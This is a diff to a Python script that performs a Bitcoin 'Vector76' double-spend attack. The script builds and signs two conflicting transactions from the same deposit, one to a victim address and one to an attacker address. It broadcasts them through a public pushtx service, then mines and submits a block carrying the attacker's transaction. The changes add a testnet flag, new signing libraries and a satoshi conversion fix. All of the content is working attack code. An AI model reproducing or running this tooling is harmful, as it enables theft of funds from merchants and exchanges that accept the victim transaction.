@@ -3,6 +3,8 @@ import argparse
 import requests
 import subprocess
 
+from bitcoin import *
+from cryptos import *
 from datetime import datetime
 from hashlib import sha256
 from bitcoinrpc.authproxy import AuthServiceProxy, JSONRPCException
@@ -36,10 +38,14 @@ parser.add_argument("amount_of_coins",
 parser.add_argument("prev_deposit_TXID",
                     help="Last deposit TXID of first attacker address",
                     type=str)
+parser.add_argument("--testnet",
+                    help="Bitcoin Network (true or false) Default = True",
+                    type=bool,
+                    default=True)
 
 def to_satoshi(btc_amount):
     satoshi = 0.00000001
-    return btc_amount // satoshi
+    return int(btc_amount / satoshi)
 
 def broadcast_transaction(raw_tx):
     url = "https://blockchain.info/pushtx"
@@ -182,27 +188,37 @@ victim_address   = args.victim_address
 attacker_address = args.attacker_address
 prev_txid  = args.prev_deposit_TXID
 amount_btc = args.amount_of_coins
+testnet    = args.testnet
 
+transaction_util = Bitcoin(testnet=testnet)
+#key   = transaction_util.encode_privkey(key, "wif")
+inputs = transaction_util.unspent(transaction_util.wiftoaddr(key))
+print(inputs)
+tx_victim = [{"txid": prev_txid, "address": victim_address, "value": to_satoshi(amount_btc)}]
+tx_victim = transaction_util.mktx(inputs, tx_victim)
+tx_victim = serialize(transaction_util.signall(tx_victim, key))
+
+tx_attacker = [{"txid": prev_txid, "address": attacker_address, "value": to_satoshi(amount_btc)}]
+tx_attacker = transaction_util.mktx(inputs, tx_attacker)
+tx_attacker = serialize(transaction_util.signall(tx_attacker, key))
 print("Connecting Node...")
 rpc_node = AuthServiceProxy(f"http://{username}:{password}@{rpc_host}:{rpc_port}")#(rpcuser=username, rpcpasswd=password, rpchost=rpc_host, rpcport=rpc_port)
 print(rpc_node.getblockchaininfo())
 print()
 amount_btc = str(amount_btc)
 
-tx_V1 = '[{"txid":"'+ prev_txid +'", "vout":0}]' '{"'+ victim_address + '":'+ amount_btc + '}'
-tx_V2 = '[{"txid":"'+ prev_txid +'", "vout":0}]' '{"'+ attacker_address + '":'+ amount_btc + '}'
-print(tx_V1)
-print(tx_V2)
-tx_victim   = rpc_node.createrawtransactionwithkey(f"{tx_V1} \"[\"{key}\"]\"")
-tx_attacker = rpc_node.createrawtransactionwithkey(f"{tx_V2} \"[\"{key}\"]\"")
-print(tx_victim)
-print(type(tx_victim))
+#tx_V1 = '[{"txid":"'+ prev_txid +'", "vout":0}]' '{"'+ victim_address + '":'+ amount_btc + '}'
+#tx_V2 = '[{"txid":"'+ prev_txid +'", "vout":0}]' '{"'+ attacker_address + '":'+ amount_btc + '}'
+#print(tx_V1)
+#print(tx_V2)
+#tx_victim   = rpc_node.createrawtransactionwithkey(f"{tx_V1} \"[\"{key}\"]\"")
+#tx_attacker = rpc_node.createrawtransactionwithkey(f"{tx_V2} \"[\"{key}\"]\"")
 print("--------------------")
-print(f"Victim   : {victim_address}")
-print(f"Attacker : {attacker_address}")
-print(f"Send Amount : {amount_btc} BTC")
-print(f"V1 RawTx               : {tx_victim}")
-print(f"V2 RawTx               : {tx_attacker}")
+print(f"Victim      : {victim_address}")
+print(f"Attacker    : {attacker_address}")
+print(f"Send Amount (Satoshi unit)    : {amount_btc} Satoshi")
+print(f"Signed V1 RawTx               : {tx_victim}")
+print(f"Signed V2 RawTx               : {tx_attacker}")
 print("--------------------")
 
 print("[+] READY...")
@@ -212,14 +228,11 @@ input(" --- Press the enter key to continue the Vector76 attack... --- ")
 print()
 
 print("push V1 TX...")
-result = rpc_node.sendrawtransaction(tx_victim) 
+result = pushtx(tx_victim) 
 print(result)
 print("push V2 TX...")
-result = rpc_node.sendrawtransaction(tx_attacker)
+result = pushtx(tx_attacker)
 print(result)
-print("Request blockheader...")
-print(f"Mining Vector76 Block...")
-vector76_block = rpc_node.generateblock(f'{attacker_address} \'["{tx_attacker}"]\'')
 print()
 print("Request Blockheader...")
 block_header_V = get_block_header_by_txid(prev_txid)
@@ -227,9 +240,9 @@ input("--- Send the block after pressing the enter key. --- ")
 print()
 print("Mining Vector76 Block...")
 print()
+vector76_block = rpc_node.generateblock(f'{attacker_address} "[{tx_attacker}]"')
 #miner = Wallet()
 #print(miner)
-vector76_block = rpc_node.generateblock(f"{attacker_address} ['{tx_victim}', '{prev_txid}]") # 一つ目のトランザクション = 被害者あてのトランザクション?
 print(f"Submit Vector76 Block...   : {vector76_block}")
 print()
 result = rpc_node.submitblock(vector76_block)
